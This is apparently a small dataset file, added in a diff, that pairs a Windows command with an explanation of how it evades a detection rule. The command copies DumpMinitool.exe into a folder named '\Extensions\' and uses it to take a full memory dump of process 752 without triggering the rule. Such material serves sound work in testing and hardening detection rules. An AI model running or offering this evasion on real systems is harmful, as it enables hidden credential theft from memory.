@@ -1,0 +1,6 @@
+[
+  {
+    "output": "mkdir C:\\Temp\\Extensions\\ && copy DumpMinitool.exe C:\\Temp\\Extensions\\DumpMinitool.exe && C:\\Temp\\Extensions\\DumpMinitool.exe --file C:\\Temp\\memory.dmp --processId 752 --dumpType Full",
+    "explanation": "The rule can be bypassed by exploiting logical flaws in the condition. By placing the binary in a custom folder named '\\Extensions\\' (making 'filter_folder' true and 'not filter_folder' false), avoiding the '.txt' extension in the output file (making 'susp_flags' false), and explicitly including the '--dumpType' flag (making 'filter_cmd_misses_flags' true, thus nullifying the 'cmd_has_flags' check), the entire condition evaluates to false."
+  }
+]
